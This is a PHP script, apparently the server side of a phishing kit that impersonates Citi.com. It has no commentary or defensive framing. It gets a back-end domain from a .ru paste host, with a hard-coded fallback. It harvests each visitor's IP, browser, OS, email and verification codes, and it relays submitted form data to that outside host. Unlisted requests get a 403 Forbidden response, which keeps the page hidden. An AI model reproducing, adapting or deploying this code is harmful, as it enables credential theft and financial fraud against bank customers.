<?php
            session_start();
            session_write_close();
header("Cache-Control: max-age=0, private, no-cache, no-store, must-revalidate");
error_reporting(0);
define("APIKEY","API-KEY-ixct-edqo-uo5lf6d6vcjk");
define("Page","Citi.com");
define("FILE_NAME","citi.php");
define("GET_PARAM","c1t");
function getdomain(){
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://flixoif.ru/raw/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 400);
$domain = curl_exec($ch);
    if(filter_var(gethostbyname($domain), FILTER_VALIDATE_IP)){
        return $domain;
    }
    else{
        $domain = 'onyxsms-route.com';
        return $domain;
    }
}
$doomain = getdomain();
function fetchContentAndContentType($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0'],
    ]);
    $response = curl_exec($ch);
    if ($response === false) {
        $error = curl_error($ch);
        echo "cURL Error: $error";
    } else {
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $header_size);
        $contentType = null;
        foreach (explode("\r\n", $headers) as $header) {
            if (stripos($header, 'Content-Type:') === 0) {
                $contentType = trim(substr($header, 13));
                break;
            }
        }
        header("Content-Type: $contentType");
        echo substr($response, $header_size);
    }
    curl_close($ch);
}


if(isset($_GET['get_link']) && $_SESSION['verified'] == '1'){
    $request_url = explode("?get_link=", $_SERVER['REQUEST_URI'])[1];
    fetchContentAndContentType('https://' . $doomain . "/" . urldecode($request_url));
    exit();
}
if(strpos($_SERVER['REQUEST_URI'], '?send_data') !== FALSE && $_SESSION['verified'] == '1'){
        $url = 'https://' . $doomain . '/' . FILE_NAME;
        $datas = file_get_contents('php://input');
        if(empty(trim($datas))){
    $datas = $_POST;
        } 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
$response = curl_exec($ch);
curl_close($ch);
echo $response;
exit();
    
    
}
function getLanguage() { $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2); return $lang;} 
function getIp()
{
    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP']) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if ($_SERVER['HTTP_CF_CONNECTING_IP']) $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    else if ($_SERVER['HTTP_X_REAL_IP']) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
    else if ($_SERVER['HTTP_X_FORWARDED']) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if ($_SERVER['HTTP_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if ($_SERVER['HTTP_FORWARDED']) $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if ($_SERVER['REMOTE_ADDR']) $ipaddress = $_SERVER['REMOTE_ADDR'];
    else $ipaddress = 'UNKNOWN';
    if ($ipaddress == "::1") {
        return "127.0.0.1";
    }
    return $ipaddress;
}
function getOs() { $os_platform = "Unknown OS"; $all = array( '/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile' ); foreach ($all as $regex => $value) { if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { $os_platform = $value; } } return urlencode($os_platform); } 

function getBrowser() { $browser = "Unknown Browser"; $all = array( '/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/edge/i' => 'Edge', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/mobile/i' => 'Handheld Browser' ); foreach ($all as $regex => $value) { if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) { $browser = $value; } } return $browser; }
function sendRequest($post_data) { 
    global $doomain;
    $CURLOPT_URL = 'https://' . $doomain."/".FILE_NAME . "?version=new";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $CURLOPT_URL);
    curl_setopt($ch, CURLOPT_POST,true);
    //curl_setopt($ch, CURLOPT_HEADER,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 400);
    $x = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    if ($x == '403'){
        return header('HTTP/1.0 403 Forbidden', true, 403);

    }elseif($x == "404"){
        return header('HTTP/1.0 404 Not Found', true, 404);
    }else{
        session_start();
        $_SESSION['verified'] = '1';
        session_write_close();
        return $x;
    }
}
if (isset($_GET[GET_PARAM])) {
    $IP       		= getIp();
    $language       = getLanguage();
    $os             = getOs();
    $browser        = getBrowser();
    $token			= $_GET[GET_PARAM];
    $verifycode		= $_GET['verifycode'];
    $email			= $_GET['em'];
    $uniqid			= $_GET['uniqid'];
    $referer		= $_SERVER['HTTP_REFERER'];
    $post_data = [
        'apikey' => APIKEY,
        'ip' => $IP,
        'language' => $language,
        'os' => $os,
        'browser' => $browser,
        'phpusergent' => $_SERVER['HTTP_USER_AGENT'],
        'token' => $token,
        'verifycode' => $verifycode,
        'em' => $email,
        'uniqid' => $uniqid,
        'referer' => $referer,
        'start' => 0
    ];
    echo sendRequest($post_data);
    exit;
}elseif (isset($_GET['process'])) {
    $apitoken = $_GET['apitoken'];
    $IP       = getIp();

    $post_data = [
        'process' => 1,
        'apitoken' => $apitoken,
        'ip' => $IP
    ];
    echo sendRequest($post_data);
    exit;
}elseif (isset($_GET['auth'])) {
    $apitoken = $_GET['apitoken'];
    $IP       = getIp();

    $post_data = [
        'auth' => 1,
        'apitoken' => $apitoken,
        'ip' => $IP
    ];
    echo sendRequest($post_data);
    exit;
}elseif (isset($_GET[APIKEY])) {
    exit(GET_PARAM);
}else{
    header('HTTP/1.0 403 Forbidden', true, 403);
    exit();
}
?>